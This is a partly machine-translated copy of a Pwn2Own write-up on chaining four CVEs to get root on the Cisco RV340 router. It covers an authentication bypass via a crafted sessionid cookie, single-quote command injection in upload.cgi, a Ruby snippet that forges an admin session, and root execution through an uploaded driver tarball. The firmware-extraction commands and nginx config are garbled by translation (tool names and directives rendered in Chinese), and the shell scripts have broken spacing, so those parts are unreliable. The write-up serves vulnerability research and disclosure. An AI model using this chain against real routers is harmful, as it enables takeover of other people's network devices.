<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.relyze.com](https://blog.relyze.com/2022/04/pwning-cisco-rv340-with-4-bug-chain.html)

[在 2021 年 11 月的Austin pwn2own](https://blog.relyze.com/2021/11/pwn2own-austin-2021.html)比赛中，发现了四个漏洞并用于成功利用路由器局域网 (LAN) 端的 Cisco RV340。CVE -2022-20705 和 CVE-2022-20707 的漏洞由包括我们在内的多个参赛者，而 CVE-2022-20700 和 CVE-2022-20712 是我们的参赛作品所独有的。使用的漏洞如下：

  

*   CVE-2022-20705 - 不正确的会话管理漏洞
*   CVE-2022-20707 - 命令注入漏洞
*   CVE-2022-20700 - 权限提升漏洞
*   CVE-2022-20712 - 上传模块远程代码执行漏洞

  

以下 9 种型号的 Cisco 设备同时受到 CVE-2022-20700 和 CVE-2022-20705 的影响：RV160、RV160W、RV260、RV260P、RV260W、RV340、RV340W、RV345 和 RV345P。以下 4 种型号的 Cisco 设备同时受到 CVE-2022-20707 和 CVE-2022-20712 的影响：RV340、RV340W、RV345 和 RV345P。更多详细信息可以在[思科公告](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-smb-mult-vuln-KA9PK6D)中找到。

  

这篇博文详细介绍了 pwn2own 期间针对易受攻击的 Cisco RV340 设备使用的漏洞。

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEg_a_O-_sOfAM5_2lFTbkvUgFWLG0T-GYvhEhqKtnBN8e8pqHGPipKyjjsGiibNeSLz1fipZJKmDthTXO_6VfTE-z31W8089NJRvGPhXwvunaA0yxQUzN_zY4FG60KUYAMseJImU-mmXd2r-QqZ-Rqaf1-O0yMdKLgPwN0onaYGLNnUCmqB4An_Vxz7=w640-h192)](https://blogger.googleusercontent.com/img/a/AVvXsEg_a_O-_sOfAM5_2lFTbkvUgFWLG0T-GYvhEhqKtnBN8e8pqHGPipKyjjsGiibNeSLz1fipZJKmDthTXO_6VfTE-z31W8089NJRvGPhXwvunaA0yxQUzN_zY4FG60KUYAMseJImU-mmXd2r-QqZ-Rqaf1-O0yMdKLgPwN0onaYGLNnUCmqB4An_Vxz7)  

介绍
--

  

通过链接多个漏洞，我们可以利用 Cisco RV340 在 LAN 端实现远程 root 权限。我们以提供管理门户的 Web 服务器为目标，它通过 NGINX 服务器运行，监听 HTTP 端口 80 和 HTTPS 连接端口 443。我们利用身份验证绕过漏洞和逻辑问题来解决命令注入漏洞。网络服务器以用户 www-data 运行，因此我们还链接了一个特权提升漏洞以从 www-data 提升到 root 特权。 

  

[要跟进此报告，您可以从Cisco 网站](https://www.cisco.com/c/en/us/support/routers/rv340-dual-gigabit-wan-vpn-router/model.html)下载固件映像 RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img 。固件文件格式是 u-boot 传统 uImage，可以使用 u-boot-tools 包中的 dumpimage 工具在 Linux 机器上提取。映像中包含一个 UBIFS 文件系统，可以使用[ubidump](https://github.com/nlitsme/ubidump)工具提取该文件系统。运行以下命令将从固件中提取所需的文件：

  

转储图像 RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img  
转储图像 RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img -o rv340-v1.0.03.22.tar.gztar -xzf rv340-v1.0.03.22.tar.gz焦油 -xzf fw.gzubidump --savedir 。openwrt-comcerto2000-hgw-rootfs-ubi_nand.img  

将创建一个文件夹“rootfs”，其中包含本报告中描述的文件。

  

会话管理不当 (CVE-2022-20705)
-----------------------

  
命令注入漏洞存在于 /upload 统一资源标识符 (URI) 的处理程序中。此处理程序位于 /www/cgi-bin/upload.cgi 二进制文件中。要成功访问上传处理程序中的易受攻击代码，我们必须首先绕过以黄色突出显示的访问控制尝试，通过 NGINX 配置文件 /etc/nginx/conf.d/web.upload.conf 实现，如下所示。  
位置/上传{ 设置$拒绝1；  
        if (-f /tmp/websession/token/$cookie_sessionid) {                设置$拒绝“0”；        }  
        如果（$拒绝=“1”）{                返回403；        }  
upload_pass /form-file-upload; 上传存储/tmp/上传； upload_store_access 用户：rw 组：rw 全部：rw； upload_set_form_field $upload_field_name.name "$upload_file_name"; upload_set_form_field $upload_field_name.content_type "$upload_content_type"; upload_set_form_field $upload_field_name.path "$upload_tmp_path"; upload_aggregate_form_field "$upload_field_name.md5" "$upload_file_md5"; upload_aggregate_form_field "$upload_field_name.size" "$upload_file_size"; upload_pass_form_field "^.*$"; 上传清理 400 404 499 500-505； upload_resumable 开启；}  
如上面突出显示的代码所示，会话 id 值（最初在客户端成功验证自身后生成的服务器端）是从通过请求传入的 cookie 中检索的。此会话 id 值用于构建路径以测试在允许请求之前是否存在有效的会话文件。如果未找到有效的会话文件，则通过 403 禁止响应拒绝该请求。NGINX 负责解析 HTTP cookie 并通过[src/http/ngx_http_variables.c!ngx_http_variable_cookie生成 $cookie_sessionid 变量](https://github.com/nginx/nginx/blob/master/src/http/ngx_http_variables.c#L1043). 因此，不会对此会话 id cookie 值执行过滤或验证，从而允许攻击者将任意路径作为会话 id 值传递，并且此路径可以解析为允许满足检查的有效文件，即使有效文件也是如此可能不是实际的会话文件。例如，如果我们将值“../../../etc/firmware_version”作为 sessionid 传递，则此检查将通过，我们现在可以调用 /upload CGI 处理程序。值得注意的是目录 /tmp/websession/token/ 在启动设备时默认不会出现，并且仅在用户第一次成功登录时创建。为了克服这个问题，攻击者可以通过以下方式成功登录一个内置的访客帐户，其用户名和密码均为“访客”。执行此访客登录将创建 websession 目录，但是访客帐户无法访问 Web ui，因此不会创建会话。出于这个原因，我们不能使用访客会话来定位 /upload URI，而是使用此处描述的身份验证绕过。  
我们现在可以在 /www/cgi-bin/upload.cgi 二进制文件中调用 /upload 处理程序。这个二进制文件的主要功能将从 HTTP cookie 中提取会话 id 并对字符进行一些基本的完整性检查，以确保会话 id 仅包含字母、数字和几个通过正则表达式 "^[A-Za-z0" 允许的字符-9+=/]*$" 如下紫色 突出显示，然后它将调用相对虚拟地址 (RVA) 0x2684 处的易受攻击函数，如黄色突出显示。   

            v16 = strcmp_1(REQUEST_URI, "/api/operations/ciscosb-file:form-file-upload" );

            如果（v16！= 0）{

                v17 = strcmp_1(REQUEST_URI, "/upload" );

                if (v17 == 0 && HTTP_COOKIE != 0) { // if the URI is /upload and we have a sessionid in the cookie

                    v18 = strlen_1(HTTP_COOKIE);

                    if (v18 < 81) { // sanity check sessionid characters

                        v19 = match_regex("^[A-Za-z0-9+=/]*$", HTTP_COOKIE);

                        if (v19 == 0) {

                            v20 = StrBufToStr(local_0x44);

                            func_0x2684(HTTP_COOKIE, content_destination, content_option, content_pathparam, v20, content_cert_name, content_cert_type, content_password);

                        }

                    }

                }

            }

  
However, as we need to pass in the dot character as part of the authentication bypass, we will not pass this regular expression check. Fortunately, the logic that extracts the session id does not account for multiple session id values being passed in a HTTP cookie, while NGINX will use the first occurrence of a session id value in the HTTP requests cookie, the upload.cgi binary prior to the regex check, will iterate over the HTTP cookie and use the last session id value it finds and not the first. We can see below the while loop does not break after it identifies the first occurrence of a session id as highlighted in yellow.  

    if (HTTP_COOKIE != 0) { // if an cookie is available

        StrBufSetStr(cookie_str, HTTP_COOKIE);

        __s2 = StrBufToStr(cookie_str);

        next_semicolon = strtok_r(__s2, ";", &saveptr); // start to split the semicolon deliminated cookie

        HTTP_COOKIE = 0; // this variable will become the sessionid string

        while (next_semicolon != 0) {

            sessionid = strstr(next_semicolon, "sessionid=");

            if (sessionid != 0) { // advance past "sessionid=" and set the value

                HTTP_COOKIE = sessionid + 10; // advance past "sessionid=" and set the value

            }

            next_semicolon = strtok_r(0, ";", &saveptr); // keep searching

        }

    }

  
This allows an attacker to provide two session id values in a HTTP cookie. The first sessionid value as part of the authentication bypass and a second sessionid value which contains valid characters but itself does not need to represent a valid session. This second sessionid will be used by upload.cgi.  

Command Injection (CVE-2022-20707)
----------------------------------

  
The vulnerable function at RVA 0x2684 in upload.cgi takes several parameters which originate from the attacker’s HTTP POST request. These parameters are multipart form fields which are used to configure the upload operation and are retrieved as shown below:  

    // upload.cgi!main+0x164

    jsonutil_get_string(data_0x13248 + 0x4, &content_file_param, "\"file.path\"", -1);

    jsonutil_get_string(data_0x13248 + 0x4, &content_filename, "\"filename\"", -1);

    jsonutil_get_string(data_0x13248 + 0x4, &content_pathparam, "\"pathparam\"", -1);

    jsonutil_get_string(data_0x13248 + 0x4, &content_fileparam, "\"fileparam\"", -1);

    jsonutil_get_string(data_0x13248 + 0x4, &content_destination, "\"destination\"", -1);

    jsonutil_get_string(data_0x13248 + 0x4, &content_option, "\"option\"", -1);

    jsonutil_get_string(data_0x13248 + 0x4, &content_cert_name, "\"cert_name\"", -1);

    jsonutil_get_string(data_0x13248 + 0x4, &content_cert_type, "\"cert_type\"", -1);

    jsonutil_get_string(data_0x13248 + 0x4, &content_password, "\"password\"", -1);

  
The vulnerable function will create a json object to represent these input parameters based on the upload type specified in the pathparam field; such as Configuration, Firmware, Certificate, 3g-4g-driver or User. For example, a 3g-4g-driver upload will create the following json object with an attacker supplied fileparam, option and destination field:  

int __cdecl func_0x2104(int content_destination, int content_fileparam, int content_option)

{

    // ...

        StrBufSetStr(v8, "FILE://3g-4g-driver/");

        StrBufAppendStr(v8, content_fileparam);

        v9 = json_object_new_string("2.0");

        json_object_object_add(json_obj1, "jsonrpc", v9);

        v10 = json_object_new_string("action");

        json_object_object_add(json_obj1, "method", v10);

        json_object_object_add(json_obj1, "params", json_obj3);

        v11 = json_object_new_string("file-copy");

        json_object_object_add(json_obj3, &string_jsonrpc + 0x4, v11);

        json_object_object_add(json_obj3, "input", json_obj2);

        v12 = json_object_new_string("3g-4g-driver");

        json_object_object_add(json_obj2, "fileType", v12);

        json_object_object_add(json_obj2, "source", json_obj4);

        v13 = StrBufToStr(v8);

        v14 = json_object_new_string(v13);

        json_object_object_add(json_obj4, "location-url", v14);

        json_object_object_add(json_obj2, "destination", json_obj5);

        v15 = json_object_new_string(content_destination);

        json_object_object_add(json_obj5, "firmware-state", v15);

        json_object_object_add(json_obj2, "firmware-option", json_obj6);

        v16 = json_object_new_string(content_option);

        json_object_object_add(json_obj6, "reboot-type", v16);

  
This json object is then converted into a string representation and a curl command is performed via popen to perform the upload operation.   

    if (json_obj != 0) {

        json_str = json_object_to_json_string(json_obj);

        sprintf(&buff, "curl %s --cookie 'sessionid=%s' -X POST -H 'Content-Type: application/json' -d '%s'", v3, sessionid, json_str);

        debug("curl_cmd=%s", &buff);

        __stream = popen(&buff, "r");

        if (__stream != 0) {

            fread_1(&buff[2048], 2048, 1, __stream);

            fclose_1(__stream);

        }

  
The function json_object_to_json_string is from the shared object /usr/lib/libjson-c.so.2.0.1. This function fails to escape single quotes in a json value. This allows us to include a single quote in one of the input parameters for the json object, and as such we can perform a command injection attack in the constructed curl command, as highlighted in yellow above.  Commands are run with the privileges of the www-data user.  
Of note is the presence of a stack-based buffer overflow vulnerability in the unsafe sprintf call. The buffer written to is 2040 bytes in size, if we pass in an attacker-controlled form field large enough, we can overflow the buffer on the stack. As it is easier and more reliable to leverage a command injection vulnerability, we will not exploit the stack-based buffer overflow.  

Privilege Escalation (CVE-2022-20700)
-------------------------------------

  
To execute arbitrary code with root privileges we can leverage the command injection vulnerability to forge an admin session and then use this session to upload a 3g-4g-driver archive which will contain an attacker-controlled shell script that will be executed with root privileges.  
To forge an admin session, we write a json object that describes the session to the /tmp/websession/session file. This is the file that will be queried when a session id is validated by the router. We must also create an empty file whose name is that of a valid session id value. A valid session id is a base64 encoded string comprising of the username, IP address of the client and a timestamp. Our exploit will generate the admin session as follows:  

            fake_username = "sf"

            admin_sessionid = Base64.encode64("#{fake_username}/#{http.local_address}/#{uptime_seconds}").gsub("\n", "")

            websessions = % Q[{

            "max-count":1,

                "#{fake_username}" : {

                "#{admin_sessionid}":{

                    "user":"#{fake_username}",

                        "group" : "admin",

                        "time" : #{uptime_seconds},

                        "access" : 1,

                        "timeout" : 1800,

                        "leasetime" : 0

                }

            }

        }]

            websessions.gsub!("\n", "\\n")

            result = cisco_rv340_wwwdata_command_injection(http, "echo -n -e #{websessions} > /tmp/websession/session; echo -n 1")

            if (result.nil ? or result.to_i != 1)

                $stdout.puts("[-] Failed create /tmp/websession/session") if @verbose

                return nil

            end

            result = cisco_rv340_wwwdata_command_injection(http, "touch /tmp/websession/token/#{admin_sessionid}; echo -n 1")

  
  

Upload Module Remote Code Execution (CVE-2022-20712)
----------------------------------------------------

  
We now have a session id for an admin session, and we can now successfully upload a 3g-4g-driver to the router by performing a valid HTTP POST request to the /upload and /jsonrpc URI endpoints with our forged admin session id. The uploaded driver is expected to be in the form a tar.gz file. The script /usr/bin/file-copy will handle the upload as shown below:  

            INSTALL_USB_DRIVERS = "sh /usr/bin/install_usb_drivers"

            # ...

            # Download drivers from PC case           

            if["$filetype" = "3g-4g-driver"]; then

                checkPC = `echo $source_location_url | grep "$FILE_DRIVER"`

                if[-n "$checkPC"]; then

                    orig_filename = `basename $source_location_url`

                    # We assume that web server will put the file to correct location before calling this RPC

                    if[-e "$DRIVER_DL_PATH/$orig_filename"]; then

                        `$INSTALL_USB_DRIVERS $DRIVER_DL_PATH / $orig_filename 2 > / dev / null 1 > / dev / null`

                        errcode = $ ?

  
We can see file-copy will call /usr/bin/install_usb_drivers and pass in the path of the uploaded driver file. The install_usb_drivers script is as follows:  

#!/bin/sh                                                 

DRIVER_FILE = `basename $1`

DRIVER_FILE_DIR = `dirname $1`

DOWN_DIR = "/tmp/"

INSTALL_STATUS = 0

ASDSTATUS = "/tmp/asdclientstatus"

if["$DRIVER_FILE_DIR" != "."]; then

    #Absolute path

    if["$DRIVER_FILE_DIR" != "/tmp"]; then

        `cp - f $1 $DOWN_DIR`> /dev/null 2 > &1

    fi

fi

DRIVER_DIR = "/tmp/driver"

mkdir - p $DRIVER_DIR

# Extract the file

tar - xzf $DOWN_DIR$DRIVER_FILE - C $DRIVER_DIR

if["$?" - eq 0]; then

    # Install the driver

    `/${DRIVER_DIR}/sbin/usb-modem install` > /dev/null 2 > &1

    INSTALL_STATUS = "$?"

else

    INSTALL_STATUS = 1

fi

rm - rf "$DOWN_DIR/$DRIVER_FILE"

rm - rf "$DRIVER_DIR"

echo $INSTALL_STATUS > $ASDSTATUS

exit $INSTALL_STATUS

  
上面以黄色突出显示的我们可以看到驱动程序 tar.gz 文件被提取到文件夹 /tmp/driver/ 中。然后我们可以看到，如紫色突出显示的那样，包含在提取的驱动程序中的文件随后被执行。攻击者可以在驱动程序 tar.gz 文件中提供文件 usb-modem 并因此以 root 权限执行任意命令。